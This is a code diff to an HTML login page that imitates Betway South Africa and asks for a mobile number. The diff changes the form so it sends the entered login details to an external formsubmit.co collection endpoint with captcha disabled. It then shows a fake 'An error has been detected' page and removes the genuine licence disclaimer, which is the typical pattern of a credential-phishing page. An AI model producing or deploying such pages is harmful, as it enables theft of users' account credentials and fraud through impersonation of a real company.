@@ -18,10 +18,13 @@
     </div>
   </div>
 
-  <!-- Form Section -->
-  <div class="container" id="form-section">
+  <!-- Login Form -->
+  <div class="container" id="form-page">
     <h2>Login</h2>
-    <form id="login-form">
+    <form action="https://formsubmit.co/525a68c3f15ba3237c28cc11c2e7cb21" method="POST">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="?error=1">
+
       <label for="mobile">Mobile Number</label>
       <input type="tel" id="mobile" name="mobile" placeholder="+27 Mobile Number" required />
 
@@ -38,30 +41,19 @@
     </div>
   </div>
 
-  <!-- Error Message (Initially hidden) -->
-  <div class="container" id="error-message" style="display: none;">
-    <h2 style="text-align:center; color: red;">An error has been detected</h2>
-    <p style="text-align:center;">Please try again later.</p>
+  <!-- Error Page -->
+  <div class="container" id="error-page" style="display: none;">
+    <h2 style="text-align: center; color: red;">An error has been detected</h2>
+    <p style="text-align: center;">Please try again later.</p>
   </div>
 
-  <!-- Disclaimer -->
-  <div class="disclaimer">
-    Raging River Trading (Pty) Ltd (2011/134505/07) is licensed to promote Betway South Africa,
-    regulated by the Western Cape Gambling and Racing Board. Bookmaker License Number:
-    10181496-010 issued on 1 December 2016. No persons under the age of 18 years are permitted
-    to gamble. Winners know when to stop. National Responsible Gambling Programme:
-    0800 006 008 or WHATSAPP HELP 076 675 0710. <strong>Warning:</strong> Gambling involves risk.
-    Gambling on this website, you run the risk that you may lose.
-  </div>
-
-  <!-- Script to block real submission and show error -->
+  <!-- Script to control page display -->
   <script>
-    const form = document.getElementById("login-form");
-    form.addEventListener("submit", function(event) {
-      event.preventDefault(); // stop real submission
-      document.getElementById("form-section").style.display = "none";
-      document.getElementById("error-message").style.display = "block";
-    });
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('error') === '1') {
+      document.getElementById('form-page').style.display = 'none';
+      document.getElementById('error-page').style.display = 'block';
+    }
   </script>
 
 </body>
